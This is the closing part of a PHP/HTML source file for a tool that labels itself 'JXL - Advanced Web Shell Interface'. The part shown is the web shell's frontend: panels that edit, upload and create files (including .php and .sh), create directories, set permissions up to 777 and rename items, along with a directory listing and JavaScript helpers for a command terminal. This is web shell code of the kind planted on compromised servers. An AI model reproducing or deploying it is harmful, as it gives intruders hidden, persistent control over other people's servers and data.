                    <textarea name="content" id="content" rows="25" placeholder="File content will appear here..."><?php echo htmlspecialchars($result); ?></textarea>
                </div>
                <input type="submit" value="💾 Save File">
            </form>
        </div>
        <?php
                break;
                
            case 'upload':
        ?>
        <div class="panel">
            <h2><i class="fas fa-cloud-upload-alt"></i> File Upload</h2>
            <div class="status-indicator status-safe">
                <i class="fas fa-folder"></i> Upload destination: <?php echo htmlspecialchars($current_dir); ?>
            </div>
            <form method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="files"><i class="fas fa-file-upload"></i> Select Files:</label>
                    <input type="file" name="files[]" id="files" multiple>
                </div>
                <input type="submit" value="📤 Upload Files">
            </form>
            
            <?php if ($result !== null && is_array($result)): ?>
            <h3><i class="fas fa-list-check"></i> Upload Results:</h3>
            <table>
                <tr>
                    <th><i class="fas fa-file"></i> Filename</th>
                    <th><i class="fas fa-check-circle"></i> Status</th>
                </tr>
                <?php foreach ($result as $filename => $status): ?>
                <tr>
                    <td><?php echo htmlspecialchars($filename); ?></td>
                    <td>
                        <span class="badge badge-<?php echo $status ? 'success' : 'danger'; ?>">
                            <i class="fas fa-<?php echo $status ? 'check' : 'times'; ?>"></i>
                            <?php echo $status ? 'SUCCESS' : 'FAILED'; ?>
                        </span>
                    </td>
                </tr>
                <?php endforeach; ?>
            </table>
            <?php endif; ?>
        </div>
        <?php
                break;
                
            case 'create':
        ?>
        <div class="panel">
            <h2><i class="fas fa-file-plus"></i> Create New File</h2>
            <div class="status-indicator status-safe">
                <i class="fas fa-folder"></i> Create in: <?php echo htmlspecialchars($current_dir); ?>
            </div>
            <form method="post">
                <div class="form-group">
                    <label for="filename"><i class="fas fa-signature"></i> Filename (without extension):</label>
                    <input type="text" name="filename" id="filename" placeholder="Enter filename..." required>
                </div>
                <div class="form-group">
                    <label for="extension"><i class="fas fa-file-code"></i> File Extension:</label>
                    <select name="extension" id="extension">
                        <option value="txt">📄 Text (.txt)</option>
                        <option value="php">🐘 PHP (.php)</option>
                        <option value="html">🌐 HTML (.html)</option>
                        <option value="js">⚡ JavaScript (.js)</option>
                        <option value="css">🎨 CSS (.css)</option>
                        <option value="py">🐍 Python (.py)</option>
                        <option value="sh">🐚 Shell Script (.sh)</option>
                        <option value="sql">🗄️ SQL (.sql)</option>
                        <option value="json">📋 JSON (.json)</option>
                        <option value="xml">📰 XML (.xml)</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="content"><i class="fas fa-code"></i> File Content:</label>
                    <textarea name="content" id="content" rows="20" placeholder="Enter your file content here..."></textarea>
                </div>
                <input type="submit" value="✨ Create File">
            </form>
        </div>
        <?php
                break;
                
            case 'mkdir':
        ?>
        <div class="panel">
            <h2><i class="fas fa-folder-plus"></i> Create New Directory</h2>
            <div class="status-indicator status-safe">
                <i class="fas fa-folder"></i> Create in: <?php echo htmlspecialchars($current_dir); ?>
            </div>
            <form method="post">
                <div class="form-group">
                    <label for="dirname"><i class="fas fa-folder"></i> Directory Name:</label>
                    <input type="text" name="dirname" id="dirname" placeholder="Enter directory name..." required>
                </div>
                <input type="submit" value="📁 Create Directory">
            </form>
        </div>
        <?php
                break;
                
            case 'chmod':
        ?>
        <div class="panel">
            <h2><i class="fas fa-key"></i> Change Permissions</h2>
            <div class="status-indicator status-warning">
                <i class="fas fa-file"></i> Target: <?php echo htmlspecialchars(basename($_GET['item'])); ?>
            </div>
            <form method="post">
                <div class="form-group">
                    <label for="mode"><i class="fas fa-shield-alt"></i> Permission Mode:</label>
                    <select name="mode" id="mode">
                        <option value="644">644 (rw-r--r--) - Standard Files</option>
                        <option value="755">755 (rwxr-xr-x) - Executable Files/Directories</option>
                        <option value="666">666 (rw-rw-rw-) - Read/Write for All</option>
                        <option value="777">777 (rwxrwxrwx) - Full Access for All</option>
                        <option value="600">600 (rw-------) - Owner Only</option>
                        <option value="700">700 (rwx------) - Owner Full Access Only</option>
                    </select>
                </div>
                <input type="submit" value="🔐 Change Permissions">
            </form>
        </div>
        <?php
                break;
                
            case 'rename':
        ?>
        <div class="panel">
            <h2><i class="fas fa-signature"></i> Rename Item</h2>
            <div class="status-indicator status-warning">
                <i class="fas fa-file"></i> Current name: <?php echo htmlspecialchars(basename($_GET['item'])); ?>
            </div>
            <form method="post">
                <div class="form-group">
                    <label for="newname"><i class="fas fa-edit"></i> New Name:</label>
                    <input type="text" name="newname" id="newname" value="<?php echo htmlspecialchars(basename($_GET['item'])); ?>" required>
                </div>
                <input type="submit" value="✏️ Rename">
            </form>
        </div>
        <?php
                break;
                
            default:
        ?>
        <div class="panel">
            <h2><i class="fas fa-home"></i> Welcome to JXL</h2>
            <div class="status-indicator status-safe">
                <i class="fas fa-rocket"></i> System loaded successfully in ultra safe mode. All functions are ready!
            </div>
            
            <div class="current-directory">
                <h3><i class="fas fa-map-marker-alt"></i> Current Directory: <?php echo htmlspecialchars($current_dir); ?></h3>
                <?php
                $dir_contents = safeListDir($current_dir);
                if (!empty($dir_contents)):
                ?>
                <table>
                    <tr>
                        <th><i class="fas fa-file-signature"></i> Name</th>
                        <th><i class="fas fa-tag"></i> Type</th>
                        <th><i class="fas fa-weight-hanging"></i> Size</th>
                        <th><i class="fas fa-clock"></i> Last Modified</th>
                    </tr>
                    <?php foreach (array_slice($dir_contents, 0, 10) as $item): ?>
                    <tr>
                        <td>
                            <i class="fas fa-<?php echo $item['type'] == 'dir' ? 'folder' : 'file'; ?>" 
                               style="color: <?php echo $item['type'] == 'dir' ? 'var(--warning-color)' : 'var(--secondary-color)'; ?>;"></i>
                            <?php echo htmlspecialchars($item['name']); ?>
                        </td>
                        <td>
                            <span class="badge badge-<?php echo $item['type']; ?>">
                                <?php echo strtoupper($item['type']); ?>
                            </span>
                        </td>
                        <td><?php echo is_numeric($item['size']) ? formatFileSize($item['size']) : $item['size']; ?></td>
                        <td><?php echo htmlspecialchars($item['lastmod']); ?></td>
                    </tr>
                    <?php endforeach; ?>
                </table>
                <?php if (count($dir_contents) > 10): ?>
                <div style="margin-top: 20px; text-align: center;">
                    <a href="?action=ls&dir=<?php echo urlencode($current_dir); ?>" class="btn-primary">
                        <i class="fas fa-eye"></i> View All Files (<?php echo count($dir_contents); ?> total)
                    </a>
                </div>
                <?php endif; ?>
                <?php else: ?>
                <div class="status-indicator status-warning">
                    <i class="fas fa-folder-open"></i> Directory is empty or not accessible.
                </div>
                <?php endif; ?>
            </div>
        </div>
        <?php
                break;
        }
        ?>
        
        <?php endif; ?>
        
        <footer>
            <div class="footer-content">
                <p><i class="fas fa-code"></i> &copy; <?php echo date("Y"); ?> JXL - Advanced Web Shell Interface</p>
                <p><i class="fas fa-shield-alt"></i> Ultra Safe Mode | <i class="fas fa-rocket"></i> High Performance | <i class="fas fa-lock"></i> Secure</p>
            </div>
        </footer>
    </div>

    <script>
        // Matrix Rain Effect - Enhanced
        const canvas = document.getElementById('matrixRain');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()_+-=[]{}|;:,.<>?";
        const matrixArray = matrix.split("");
        const fontSize = 12;
        const columns = canvas.width / fontSize;
        const drops = [];

        for (let x = 0; x < columns; x++) {
            drops[x] = Math.random() * canvas.height / fontSize;
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#00ff88';
            ctx.font = fontSize + 'px "Fira Code", monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(drawMatrix, 50);

        // Resize canvas on window resize
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // Enhanced input focus effects
        document.querySelectorAll('input, textarea, select').forEach(element => {
            element.addEventListener('focus', function() {
                this.style.borderColor = 'var(--primary-color)';
                this.style.boxShadow = '0 0 15px rgba(0, 255, 136, 0.3)';
            });
            
            element.addEventListener('blur', function() {
                this.style.borderColor = 'var(--border-color)';
                this.style.boxShadow = 'none';
            });
        });

        // Smooth scrolling for anchor links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            // Ctrl + / to focus first input
            if (e.ctrlKey && e.key === '/') {
                e.preventDefault();
                const firstInput = document.querySelector('input[type="text"], input[type="password"], textarea');
                if (firstInput) {
                    firstInput.focus();
                }
            }
            
            // Escape to clear focus
            if (e.key === 'Escape') {
                document.activeElement.blur();
            }
            
            // Ctrl + Enter to submit form
            if (e.ctrlKey && e.key === 'Enter') {
                const form = document.querySelector('form');
                if (form) {
                    form.submit();
                }
            }
        });

        // Enhanced console welcome message
        console.log(`
        ╔══════════════════════════════════════════════════════════════╗
        ║                          JXL SHELL                          ║
        ║                  Advanced Web Interface                     ║
        ║                                                              ║
        ║  🚀 Features:                                               ║
        ║  • Matrix Rain Background Effect                             ║
        ║  • Smooth Animations & Transitions                          ║
        ║  • Modern UI/UX Design                                      ║
        ║  • Ultra Safe Error Handling                                ║
        ║                                                              ║
        ║  ⌨️  Keyboard Shortcuts:                                    ║
        ║  • Ctrl + /     : Focus first input                         ║
        ║  • Escape       : Clear focus                               ║
        ║  • Ctrl + Enter : Submit form                               ║
        ║                                                              ║
        ║  🛡️  Security: Ultra Safe Mode Active                      ║
        ╚══════════════════════════════════════════════════════════════╝
        `);

        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            // Page initialized without notifications
        });
        
        // Terminal command functions
        function setCommand(command) {
            const commandInput = document.getElementById('command');
            if (commandInput) {
                commandInput.value = command;
                commandInput.focus();
            }
        }
        
        function copyOutput() {
            const output = document.getElementById('commandOutput');
            if (output) {
                const text = output.textContent;
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(text).then(function() {
                        // Visual feedback
                        const copyBtn = document.querySelector('.copy-btn');
                        const originalText = copyBtn.innerHTML;
                        copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                        copyBtn.style.background = 'var(--success-color)';
                        
                        setTimeout(function() {
                            copyBtn.innerHTML = originalText;
                            copyBtn.style.background = 'rgba(0, 255, 136, 0.2)';
                        }, 2000);
                    });
                } else {
                    // Fallback for older browsers
                    const textArea = document.createElement('textarea');
                    textArea.value = text;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    
                    // Visual feedback
                    const copyBtn = document.querySelector('.copy-btn');
                    const originalText = copyBtn.innerHTML;
                    copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                    copyBtn.style.background = 'var(--success-color)';
                    
                    setTimeout(function() {
                        copyBtn.innerHTML = originalText;
                        copyBtn.style.background = 'rgba(0, 255, 136, 0.2)';
                    }, 2000);
                }
            }
        }
    </script>
</body>
</html>
    